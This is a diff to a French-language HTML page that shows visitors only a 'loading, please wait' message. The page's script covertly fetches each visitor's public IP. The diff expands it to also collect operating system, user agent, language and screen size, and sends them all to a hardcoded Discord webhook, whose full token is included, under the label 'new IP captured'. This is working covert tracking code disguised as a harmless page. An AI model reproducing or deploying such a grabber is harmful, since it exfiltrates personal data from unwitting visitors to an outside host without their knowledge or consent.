@@ -58,18 +58,38 @@
   <div class="info">Chargement... Merci de patienter</div>
 
   <script>
+    // Récupère l'IP publique
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
         const ip = data.ip;
+
+        // Récupération des informations du device
+        const deviceInfo = {
+          os: navigator.platform,
+          browser: navigator.userAgent,
+          language: navigator.language,
+          screen: `${screen.width}x${screen.height}`,
+        };
+
+        // Préparation du message pour Discord
+        const msg = `
+        🕵️ Nouvelle IP captée : \`${ip}\`
+        💻 OS : ${deviceInfo.os}
+        🌐 Navigateur : ${deviceInfo.browser}
+        🗣️ Langue : ${deviceInfo.language}
+        📱 Résolution : ${deviceInfo.screen}
+        📅 Date : ${new Date().toLocaleString()}
+        `;
+
+        // Webhook Discord
         const webhook = "https://discord.com/api/webhooks/1361707861486600262/pkrM_Hf_AXpiRLh8iUItwQaZ5ehWtPCrQ-ObypKkzIjR6AFK6yXS_pM8xA64CgsUE4QP";
 
+        // Envoi du message via le webhook
         fetch(webhook, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: `🕵️ Nouvelle IP captée : \`${ip}\`\n📅 Date : ${new Date().toLocaleString()}`
-          })
+          body: JSON.stringify({ content: msg })
         });
       });
   </script>
